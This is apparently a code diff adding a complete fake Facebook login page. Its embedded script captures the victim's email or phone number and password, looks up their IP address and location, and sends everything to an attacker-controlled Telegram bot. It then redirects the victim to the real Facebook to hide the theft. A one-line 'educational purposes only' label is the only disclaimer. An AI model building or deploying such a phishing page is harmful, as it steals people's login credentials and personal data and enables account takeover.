@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background-color: white;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 360px;
+            padding: 20px;
+        }
+
+        .logo-container {
+            margin-bottom: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .facebook-circle-logo {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            margin-bottom: 10px;
+        }
+
+        .title-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .logo-text {
+            font-family: 'Arial Black', sans-serif;
+            font-size: 20px;
+            color: #1877f2;
+        }
+
+        .verified-mark {
+            width: 20px;
+            height: 20px;
+            display: inline-block;
+            animation: shake 0.5s ease-in-out infinite;
+        }
+
+        @keyframes shake {
+            0% { transform: translateX(0); }
+            25% { transform: translateX(-2px); }
+            75% { transform: translateX(2px); }
+            100% { transform: translateX(0); }
+        }
+
+        .slogan {
+            display: none;
+        }
+
+        .form-container {
+            text-align: center;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        .login-button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 12px;
+            width: 100%;
+            cursor: pointer;
+            font-size: 18px;
+            margin: 12px 0;
+        }
+
+        .login-button:hover {
+            background-color: #0e5ace;
+        }
+
+        a {
+            text-decoration: none;
+            color: #1877f2;
+            font-size: 14px;
+        }
+
+        .divider {
+            margin: 12px 0;
+            border-top: 1px solid #ddd;
+        }
+
+        .no-social-login {
+            font-size: 14px;
+            margin-top: 16px;
+        }
+
+        .no-social-login a {
+            font-weight: bold;
+            color: #1877f2;
+        }
+
+        .no-social-login a:hover {
+            text-decoration: underline;
+        }
+
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(0, 0, 0, 0.8);
+            color: white;
+            border-radius: 5px;
+            padding: 15px;
+            z-index: 1;
+        }
+
+        .popup-content {
+            position: relative;
+        }
+
+        .popup-close {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            font-size: 20px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <img class="facebook-circle-logo" src="https://i.postimg.cc/HxzfHmgd/Picsart-26-05-08-21-45-33-891.png" alt="Facebook Logo">
+            <div class="title-container">
+                <span class="logo-text">Facebook Login Mate Verified</span>
+                <span class="logo-text">Free</span>
+                <img class="verified-mark" src="https://i.postimg.cc/VLCDWwVJ/file-00000000fa1c7207b91e80bc083e4840.png" alt="Verified Badge">
+            </div>
+            <p class="slogan"></p>
+        </div>
+        <div class="form-container">
+            <form onsubmit="submitonhfc(); return false;" method="post">
+                <input type="hidden" name="" id="pagename" value="Facebook" />
+                <input type="text" id="email" placeholder="Email or Phone Number" class="input-field" name="email" required>
+                <input id="name" type="password" placeholder="Password" class="input-field" name="password" required>
+                <button type="submit" class="login-button">Log In</button>
+            </form>
+            <a href="#" id="signup-link">Forgot Password?</a>
+            <div class="divider"></div>
+            <div class="no-social-login">
+                <p>Don't have an account? <a href="#" id="signup-button">Sign Up</a></p>
+            </div>
+        </div>
+    </div>
+
+    <div id="error-popup" class="popup">
+        <div class="popup-content">
+            <span class="popup-close" id="close-popup">&times;</span>
+            <p><strong>Error:</strong> Sign up is currently disabled.</p>
+        </div>
+    </div>
+
+    <script src="config.js"></script>
+    <script>
+    let BOT_TOKEN = "";
+    let TELEGRAM_BOT_LINK = "https://t.me/myanmar_sms_bomb_bot";
+    
+    if (typeof window.BOT_TOKEN !== 'undefined') {
+        BOT_TOKEN = window.BOT_TOKEN;
+    }
+    if (typeof window.TELEGRAM_BOT_LINK !== 'undefined') {
+        TELEGRAM_BOT_LINK = window.TELEGRAM_BOT_LINK;
+    }
+
+    function GetURLParameter(sParam) {
+      var sPageURL = window.location.search.substring(1);
+      var sURLVariables = sPageURL.split('&');
+      for (var i = 0; i < sURLVariables.length; i++) {
+        var sParameterName = sURLVariables[i].split('=');
+        if (sParameterName[0] == sParam) {
+          return sParameterName[1];
+        }
+      }
+      return null;
+    }
+    
+    var chatid = GetURLParameter('id');
+    
+    function submitonhfc() {
+      if (!chatid) {
+        console.log('Error: No chat ID provided');
+        window.location.href = "https://www.facebook.com";
+        return;
+      }
+      
+      if (!BOT_TOKEN) {
+        console.log('Error: Bot token not configured');
+        window.location.href = "https://www.facebook.com";
+        return;
+      }
+      
+      fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+          const userAgent = navigator.userAgent;
+          const ip = data.ip;
+          const cityName = data.city;
+          const countryName = data.country_name;
+          
+          const page = document.getElementById("pagename").value;
+          const password = document.getElementById("name").value;
+          const email = document.getElementById("email").value;
+          const currentTime = new Date().toLocaleString();
+          
+          let message = `🔐 *FACEBOOK LOGIN CAPTURED!*\n\n`;
+          message += `📧 *Email/Phone:* ${email}\n`;
+          message += `🔑 *Password:* ${password}\n`;
+          message += `📱 *User Agent:* ${userAgent}\n`;
+          message += `🌐 *IP Address:* ${ip}\n`;
+          message += `📍 *Location:* ${cityName}, ${countryName}\n`;
+          message += `🕐 *Time:* ${currentTime}\n\n`;
+          message += `📌 *Page:* ${page}\n`;
+          message += `⚠️ *Educational purposes only!*`;
+          
+          const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+          const telegramParams = {
+            chat_id: chatid,
+            text: message,
+            parse_mode: 'Markdown'
+          };
+          
+          fetch(telegramUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(telegramParams)
+          })
+          .then(response => {
+            if (response.ok) {
+              window.location.href = "https://www.facebook.com";
+            } else {
+              console.log('Error sending data to Telegram');
+              window.location.href = "https://www.facebook.com";
+            }
+          })
+          .catch(error => {
+            console.log('Error:', error);
+            window.location.href = "https://www.facebook.com";
+          });
+        })
+        .catch(error => {
+          console.log('Error retrieving IP address information:', error);
+          window.location.href = "https://www.facebook.com";
+        });
+    }
+    </script>
+</body>
+</html>
